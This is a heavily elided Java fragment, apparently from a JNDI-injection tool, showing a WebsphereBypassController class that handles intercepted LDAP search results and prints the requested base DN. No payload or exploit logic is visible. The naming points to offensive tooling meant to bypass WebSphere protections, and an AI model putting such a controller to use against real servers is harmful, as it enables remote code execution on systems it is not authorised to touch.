...
import com.mickhu.ldap.enumtypes.WebsphereActionType;
...
public class WebsphereBypassController implements LdapController {
    ...
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        ...
        System.out.println(result.getRequest().getBaseDN());
...
//            ref.add(new StringRefAddr("WSDL location", "0.0.0.0"));
